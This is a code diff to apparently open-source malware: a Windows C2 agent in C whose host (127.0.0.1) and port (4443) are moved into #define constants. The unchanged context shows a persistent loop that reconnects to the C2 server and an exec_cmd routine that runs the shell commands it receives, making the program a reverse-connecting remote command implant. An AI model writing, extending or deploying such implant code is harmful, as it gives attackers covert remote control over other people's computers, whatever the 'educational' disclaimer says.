@@ -8,6 +8,9 @@ Use educationally/legally.
 #include <stdint.h>
 #include "sakito_tools.h"
 
+#define HOST "127.0.0.1"
+#define PORT 4443
+
 #pragma comment(lib, "Ws2_32.lib")
 
 // Function to create connect socket.
@@ -30,12 +33,12 @@ const SOCKET create_socket() {
 }
 
 // Function to connect the connect socket to c2 server.
-int c2_connect(const SOCKET connect_socket, const char* host, const int port) {
+int c2_connect(const SOCKET connect_socket) {
 	struct sockaddr_in hint;
 	hint.sin_family = AF_INET;
 
-	hint.sin_port = htons(port);
-	inet_pton(AF_INET, host, &hint.sin_addr);
+	hint.sin_port = htons(PORT);
+	inet_pton(AF_INET, HOST, &hint.sin_addr);
 
 	// Connect to server hosting c2 service
 	if (connect(connect_socket, (struct sockaddr*)&hint, sizeof(hint)) == SOCKET_ERROR) {
@@ -161,10 +164,6 @@ int exec_cmd(const SOCKET connect_socket, char* const buf) {
 
 // Main function for connecting to c2 server & parsing c2 commands.
 int main(void) {
-	// immutable host and port.
-	const char host[] = "127.0.0.1";
-	const int port = 4443;
-
 	while (1) {
 		// Create the connect socket.
 		const SOCKET connect_socket = create_socket();
@@ -173,7 +172,7 @@ int main(void) {
 	           occurs (connection lost, etc) break the loop and reconnect & restart loop. The switch-
 		   statement will parse & execute functions based on the order of probability.*/
 		if (connect_socket != INVALID_SOCKET) {
-			int i_result = c2_connect(connect_socket, host, port);
+			int i_result = c2_connect(connect_socket);
 			while (i_result > 0) {
 				// BUFLEN + 1 + 4, for null byte and "2>&1" string concatenation
 				char buf[BUFLEN + 5] = { 0 };
